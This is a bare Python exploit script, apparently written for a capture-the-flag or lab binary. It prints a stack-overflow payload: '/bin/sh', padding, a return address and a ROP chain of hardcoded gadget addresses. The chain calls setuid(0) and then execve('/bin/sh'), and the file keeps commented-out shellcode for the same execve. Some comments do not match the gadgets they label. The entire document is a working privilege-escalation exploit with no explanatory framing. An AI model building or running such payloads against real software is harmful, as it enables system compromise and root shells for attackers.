#!/usr/bin/env python3

import sys

# sys.stdout.buffer.write(b'A'*8)

sys.stdout.buffer.write(b'/bin/sh\x00')
sys.stdout.buffer.write(b'A'*112) #padding
sys.stdout.buffer.write(0x0000000000456587.to_bytes(8, 'little')) #rerturn address

# pop rax ret
sys.stdout.buffer.write(int(105).to_bytes(8, 'little')) 
sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little')) #ret

#mov rdi 0
sys.stdout.buffer.write(0x00.to_bytes(8, 'little')) 
sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, 'little')) 

#systemcall ret
sys.stdout.buffer.write(0x000000000048c0aa.to_bytes(8, 'little')) 

# pop rax ; pop rdx ; pop rbx ; ret
sys.stdout.buffer.write(int(59).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x00.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x00.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000040250f.to_bytes(8, 'little'))

# pop rdi rets
sys.stdout.buffer.write(0x7ffffff6e2c0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000040a57e.to_bytes(8, 'little')) 

# pop rsi ret
sys.stdout.buffer.write(0x00.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x000000000041b506.to_bytes(8, 'little')) 

#systemcall ret
sys.stdout.buffer.write(b'A'*8)


# mov rax,59
# lea rdi,[rip+16]
# mov rsi,0
# mov rdx,0
# syscall
# .asciz "/bin/sh"



# sys.stdout.buffer.write(b'A'*202)
# sys.stdout.buffer.write(b'A'*8)
# sys.stdout.buffer.write(0x7ffffff6df80.to_bytes(8, 'little'))